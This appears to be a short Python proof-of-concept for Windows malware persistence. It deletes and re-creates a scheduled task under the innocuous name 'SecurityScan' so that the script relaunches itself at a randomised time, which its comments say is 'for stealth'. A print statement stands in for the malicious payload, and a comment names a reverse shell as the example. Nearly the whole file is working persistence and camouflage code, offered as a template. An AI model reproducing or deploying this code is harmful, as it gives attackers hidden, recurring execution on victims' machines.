import os, random
from datetime import datetime,timedelta

if os.system("schtasks /query /tn SecurityScan") == 0:      # Checking if the system a task scheduled already where we want to schedule ours
    os.system("schtasks /delete /f /tn SecurityScan")

print("I am doing malicious things")                        # We do malicious things here, e.g. reverse shell

filedir = os.path.join(os.getcwd(),"sched.py")              # Building PATH for this Python script

maxInterval = 1
interval = 1+(random.random()*(maxInterval-1))              # Making the time of task random for stealth   
dt = datetime.now() + timedelta(minutes=interval)           
t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
d = "%s/%s/%s" % (dt.month,str(dt.day).zfill(2),dt.year)
os.system('schtasks /create /tn SecurityScan /tr "'+filedir+'" /sc once /st '+t+' /sd '+d)
input()